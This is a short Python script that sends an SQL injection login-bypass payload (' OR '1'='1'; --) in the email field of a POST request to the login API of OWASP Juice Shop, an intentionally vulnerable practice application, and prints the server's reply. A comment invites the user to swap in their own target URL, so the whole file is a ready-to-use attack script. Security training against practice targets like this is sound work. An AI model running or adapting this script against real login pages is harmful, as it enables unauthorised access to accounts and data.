# response_analysis.py
import requests

def analyze_response(url, payload):
    response = requests.post(url, data={"email": payload})
    status_code = response.status_code
    content = response.text

    print(f"Status Code: {status_code}")
    print(f"Content: {content}")

if __name__ == "__main__":
    url = "https://juice-shop.herokuapp.com/api/Users/login"  # Replace with your target URL
    payload = "' OR '1'='1'; --"  # Example payload
    analyze_response(url, payload)
